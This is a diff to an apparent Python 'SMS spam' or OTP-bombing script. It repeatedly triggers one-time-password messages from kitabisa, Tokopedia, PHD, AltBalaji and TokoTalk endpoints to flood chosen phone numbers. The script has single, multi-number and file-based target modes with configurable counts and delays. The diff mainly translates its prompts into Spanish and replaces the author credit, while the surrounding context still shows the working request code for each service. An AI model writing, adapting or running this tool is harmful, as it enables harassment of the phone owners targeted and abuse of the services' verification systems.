@@ -19,7 +19,7 @@ bgm = '\x1b[41m'
 bgp = '\x1b[47m'
 res = '\x1b[40m'
 # -------------------------------------------------------
-# Sebuah Program Python Yg Menggunakan Program Berorientasi Object
+# Un programa Python que utiliza programación orientada a objetos
 #------------------------Classes------------------------
 class spam:
 		
@@ -29,9 +29,9 @@ class spam:
 	def spam(self):
 		hasil=requests.get(f'https://core.ktbs.io/v2/user/registration/otp/{self.nomer}')
 		if hasil.status_code == 200:
-			return f'\x1b[92mSpamm kitabisa {self.nomer} \033[1;32mSuccess!'
+			return f'\x1b[92mSpam podemos {self.nomer} \033[1;32mÉxito!'
 		elif hasil.status_code == 500:
-			return f'\x1b[91mSpamm kitabisa {self.nomer} \x1b[91mFail!'
+			return f'\x1b[91mSpam podemos {self.nomer} \x1b[91mFall0!'
 			
 	def tokped(self):
 		rands=random.choice(open('ua.txt').readlines()).split('\n')[0]
@@ -57,18 +57,18 @@ class spam:
 			"number_otp_digit" : "6"
 		}
 		req = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = kirim, data = formulir).text
-		if 'Anda sudah melakukan 3 kali pengiriman kode' in req:
-			return f'\x1b[91mSpamm Tokped {self.nomer} \x1b[91mFail!'
+		if 'Has enviado el código 3 veces.' in req:
+			return f'\x1b[91mSpam en Tokopedia {self.nomer} \x1b[91mFallo!'
 		else:
-			return f'\x1b[92mSpamm Tokped {self.nomer} {h}Success!'
+			return f'\x1b[92mSpam en Tokopedia {self.nomer} {h}Exito!'
 
 	def phd(self):
 		param = {'phone_number':self.nomer}
 		r = requests.post('https://www.phd.co.id/en/users/sendOTP', data=param)
-		if 'We have sent an OTP to your phone, Please enter the 4 digit code.' in r.text:
-			return f'\x1b[92mSpamm PHD {self.nomer} {h}Success!'
+		if 'Hemos enviado un OTP a tu teléfono, ingresa el código de 4 dígitos.' in r.text:
+			return f'\x1b[92mSpam PHD {self.nomer} {h}Exito!'
 		else:
-			return f'\x1b[91mSpamm PHD {self.nomer} {m}Fail!'
+			return f'\x1b[91mSpamm PHD {self.nomer} {m}Fallo!'
 			
 	def balaji(self):
 		urlb="https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=ID"
@@ -100,15 +100,15 @@ class spam:
 			"content-type":"application/json;charset=UTF-8"
 		}
 		if 'expireAt' in requests.post("https://api.tokotalk.com/v1/no_auth/verifications",data = data,headers=head).text:
-			return f'\x1b[92mSpamm TokoTalk {self.nomer} {h}Success!'
+			return f'\x1b[92mSpamm TokoTalk {self.nomer} {h}Exito!'
 		else:
-			return f'\x1b[92mSpamm TokoTalk {self.nomer} {m}Fail!'
+			return f'\x1b[92mSpamm TokoTalk {self.nomer} {m}Fallo!'
 # ------------------------------------------------------------
 
-# ---------------------------Fungsi----------------------------
+# ---------------------------Función----------------------------
 def apakah():
 	while True:
-		lan=str(input(k+'\tWant more? y/n : '+h))
+		lan=str(input(k+'\t¿Quieres más? y/n : '+h))
 		if( lan == 'y' or lan == 'Y'):
 			jnspam()
 		elif(lan == 'n' or lan == 'N'):
@@ -117,11 +117,11 @@ def apakah():
 		else:
 			continue
 def files():
-	fil=str(input(k+'\tFile : '+h))
+	fil=str(input(k+'\tArchivo : '+h))
 	if fil in os.listdir(os.getcwd()):
 		l=open(fil,'r').readlines()
 		js=int(input(k+'\tTotal spam : '+h))
-		dly=int(input(k+'\tDelay : '+h))
+		dly=int(input(k+'\tDemora : '+h))
 		for pp in range(js):
 			for d in range(len(l)-1):
 				io=l[d].split('\n')[0]
@@ -147,11 +147,11 @@ def files():
 				time.sleep(dly)
 		apakah()
 	else:
-		print(m+f'\tFile {fil} doesn`t exist')
+		print(m+f'\tArchivo {fil} no existe')
 def single():
-	nomer=str(input(k+'\tPhone number : '+h))
+	nomer=str(input(k+'\tNúmero de teléfono : '+h))
 	jm=int(input(k+'\tTotal spam : '+h))
-	dly=int(input(k+'\tDelay : '+h))
+	dly=int(input(k+'\tDemora : '+h))
 	for oo in range(jm):
 		z=spam(nomer)
 		if jns == 'ktbs':
@@ -176,11 +176,11 @@ def single():
 	apakah()
 def multi():
 	nomer=[]
-	jum=int(input(k+'\tTotal number : '+h))
+	jum=int(input(k+'\tNúmero total : '+h))
 	for i in range(jum):
-		nomer.append(str(input(k+f'\tNumber -{i+1} : '+h)))
+		nomer.append(str(input(k+f'\tNúmero -{i+1} : '+h)))
 	spm=int(input(k+'\tTotal spam : '+h))
-	dly=int(input(k+'Delay : '+h))
+	dly=int(input(k+'Demora : '+h))
 	kk=len(nomer)
 	for i in range(spm):
 		for ss in range(kk):
@@ -205,10 +205,10 @@ def multi():
 				print()
 		time.sleep(dly)
 	apakah()
-#-------------------------Fungsi Banner-----------------------
+#-------------------------Función de banner-----------------------
 def logo():
 	os.system('clear')
-	auth=m+'  Author : '+k+'./kitsune'
+	auth=m+'  Author : '+k+'./Freedarwuin'
 	# jika ingin m3namambah kan variabel dan mengubah data variabel kitsune bisa menambahkan %s menambahkan variabel terus di ubah menjjadu string, %d = mengubah data menjadi decimal , %i = mengubah data menjadi integer
 	return '''
 %s╭━┳━╭━╭━╮%s╮╲╲╲╲╲╲%s╔═╗╔═╗╔═╗╔╦╗
@@ -265,7 +265,7 @@ def main():
 	elif( pil == '0' or pil == '00'):
 		jnspam()
 	else:
-		print(m+'             Don`t leave it blank')
+		print(m+'             No lo dejes en blanco')
 		time.sleep(2)
 		main()
 def jnspam():
@@ -295,7 +295,7 @@ def jnspam():
 		elif( oy == '0' or oy == '00' ):
 			sys.exit()
 		else:
-			print(m+'             Don`t leave it blank')
+			print(m+'             No lo dejes en blanco')
 			continue
 	main()
 if __name__ == '__main__':
